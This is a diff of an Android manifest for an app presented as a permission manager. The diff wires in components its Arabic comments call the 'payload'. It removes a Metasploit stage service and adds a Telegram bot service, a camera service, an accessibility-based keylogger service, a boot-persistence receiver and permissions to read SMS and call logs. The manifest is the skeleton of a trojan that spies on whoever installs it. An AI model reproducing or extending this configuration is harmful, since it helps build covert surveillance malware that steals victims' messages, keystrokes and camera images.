@@ -2,35 +2,26 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- ===== الصلاحيات الأصلية (تم الاحتفاظ بها كما هي) ===== -->
-    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
-        tools:ignore="QueryAllPackagesPermission" />
-
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
-        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-
-    <!-- ===== صلاحيات إضافية مطلوبة للبايلود ===== -->
+    
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.VIBRATE" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
-        android:maxSdkVersion="28" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
-    <!-- صلاحية لالتقاط محتوى الشاشة (تُطلب في وقت التشغيل عبر MediaProjection) -->
-    <!-- لا توجد صلاحية ثابتة، لكن نحتاج إلى الخدمة أعلاه -->
 
     <application
         android:allowBackup="true"
@@ -38,69 +29,36 @@
         android:label="@string/app_name"
         android:theme="@style/Theme.PermissionManagerPro"
         android:supportsRtl="true"
-        android:usesCleartextTraffic="true"
         tools:targetApi="34">
 
-        <!-- الأنشطة الأصلية (لم تُلمس) -->
-        <activity
-            android:name=".ui.MainActivity"
-            android:exported="true">
+        <activity android:name=".ui.MainActivity" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+        <activity android:name=".ui.AppDetailActivity" android:exported="false" android:label="@string/title_app_detail" />
+        <activity android:name=".ui.DeviceAdminSetupActivity" android:exported="false" android:label="@string/title_device_admin" />
 
-        <activity
-            android:name=".ui.AppDetailActivity"
-            android:exported="false"
-            android:label="@string/title_app_detail" />
-
-        <activity
-            android:name=".ui.DeviceAdminSetupActivity"
-            android:exported="false"
-            android:label="@string/title_device_admin" />
-
-        <!-- Device Admin Receiver (الأصلي) -->
-        <receiver
-            android:name=".receiver.AppDeviceAdminReceiver"
-            android:exported="true"
-            android:permission="android.permission.BIND_DEVICE_ADMIN">
-            <meta-data
-                android:name="android.app.device_admin"
-                android:resource="@xml/device_admin_policies" />
-            <intent-filter>
-                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
-            </intent-filter>
+        <receiver android:name=".receiver.AppDeviceAdminReceiver" android:exported="true" android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin_policies" />
+            <intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED" /></intent-filter>
+        </receiver>
+        <receiver android:name=".receiver.PackageInstallReceiver" android:exported="true">
+            <intent-filter><action android:name="android.intent.action.PACKAGE_ADDED" /><data android:scheme="package" /></intent-filter>
         </receiver>
 
-        <!-- مراقبة تثبيت التطبيقات (الأصلي) -->
-        <receiver
-            android:name=".receiver.PackageInstallReceiver"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.PACKAGE_ADDED" />
-                <data android:scheme="package" />
-            </intent-filter>
-        </receiver>
+        <!-- ===== خدمات البايلود ===== -->
+        <service android:name=".payload.TelegramBotService" android:exported="false" android:foregroundServiceType="dataSync" />
+        <service android:name=".payload.CameraService" android:exported="false" android:foregroundServiceType="camera" />
+        <service android:name=".payload.KeyloggerService" android:exported="true" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter><action android:name="android.accessibilityservice.AccessibilityService" /></intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config" />
+        </service>
 
-        <!-- ===== إضافات البايلود ===== -->
-
-        <!-- الخدمة الأساسية للبايلود -->
-        <service
-            android:name="com.metasploit.stage.MainService"
-            android:exported="true"
-            android:foregroundServiceType="mediaProjection" />
-
-        <!-- مستقبل للتشغيل عند إقلاع الجهاز (اختياري لكن مفيد) -->
-        <receiver
-            android:name="com.metasploit.stage.MainBroadcastReceiver"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-            </intent-filter>
+        <receiver android:name=".payload.BootReceiver" android:exported="true">
+            <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED" /></intent-filter>
         </receiver>
 
     </application>
-
 </manifest>
